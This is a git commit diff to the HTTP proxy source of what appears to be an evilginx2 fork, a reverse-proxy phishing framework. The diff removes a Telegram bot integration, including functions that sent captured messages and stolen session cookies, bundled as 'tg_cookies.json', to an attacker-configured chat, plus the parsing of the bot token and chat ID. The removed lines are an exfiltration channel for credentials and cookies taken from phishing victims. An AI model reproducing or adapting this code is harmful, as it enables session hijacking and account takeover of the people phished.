cc32e82c37db054b1cec8738e7359bf98e812974
Loutcho_Q <63863060+loutchoo@users.noreply.github.com>
2023-05-16 15:46:01 +0200

    Update http_proxy.go

--- core/http_proxy.go
+++ core/http_proxy.go
@@ -32,13 +32,13 @@ import (
 	"sync"
 	"time"
 
+	"golang.org/x/net/proxy"
+
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
-	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
-	"golang.org/x/net/proxy"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -80,8 +80,6 @@ type HttpProxy struct {
 	ip_sids           map[string]string
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
-	telegram_bot      *tgbotapi.BotAPI
-	telegram_chat_id  int64
 	session_mtx       sync.Mutex
 }
 
@@ -95,27 +93,6 @@ type ProxySession struct {
 
 type data struct {
 	Fai string `json:"as"`
-}
-
-func (p *HttpProxy) NotifyWebhook(msg string) {
-	if p.telegram_bot != nil {
-		creds := tgbotapi.NewMessage(p.telegram_chat_id, msg)
-		if _, err := p.telegram_bot.Send(creds); err != nil {
-			log.Error("failed to send telegram webhook with length %v: %s", len(msg), err)
-		}
-	}
-}
-
-func (p *HttpProxy) SendCookies(msg string) {
-	if p.telegram_bot != nil {
-		cookies := tgbotapi.NewDocument(p.telegram_chat_id, tgbotapi.FileBytes{
-			Name:  "tg_cookies.json",
-			Bytes: []byte(msg),
-		})
-		if _, err := p.telegram_bot.Send(cookies); err != nil {
-			log.Error("failed to send telegram cookie webhook in one file. msg length %v: err: %s", len(msg), err)
-		}
-	}
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
@@ -132,7 +109,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
-		telegram_bot:      nil,
 	}
 
 	p.Server = &http.Server{
@@ -150,19 +126,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		} else {
 			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
 		}
-	}
-
-	if len(cfg.webhook_telegram) > 0 {
-		confSlice := strings.Split(cfg.webhook_telegram, "/")
-		if len(confSlice) != 2 {
-			log.Fatal("telegram config not in correct format: <bot_token>/<chat_id>")
-		}
-		bot, err := tgbotapi.NewBotAPI(confSlice[0])
-		if err != nil {
-			log.Fatal("telegram NewBotAPI: %v", err)
-		}
-		p.telegram_bot = bot
-		p.telegram_chat_id, _ = strconv.ParseInt(confSlice[1], 10, 64)
 	}
 
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
